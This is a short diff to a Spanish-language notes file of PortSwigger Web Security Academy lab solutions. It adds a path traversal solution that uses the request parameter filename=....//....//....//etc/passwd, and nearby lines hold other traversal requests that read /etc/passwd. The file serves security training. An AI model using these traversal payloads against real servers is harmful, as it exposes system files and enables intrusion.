@@ -97,6 +97,12 @@ Hacer una request a https://LABID.web-security-academy.net/image?filename=../../
 
 Hacer una request a https://LABID.web-security-academy.net/image?filename=/etc/passwd
 
+### [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
+
+#### Solución:
+
+Hacer una request a https://LABID.web-security-academy.net/image?filename=....//....//....//etc/passwd
+
 ---
 
 ## [Access control vulnerabilities](https://portswigger.net/web-security/access-control)
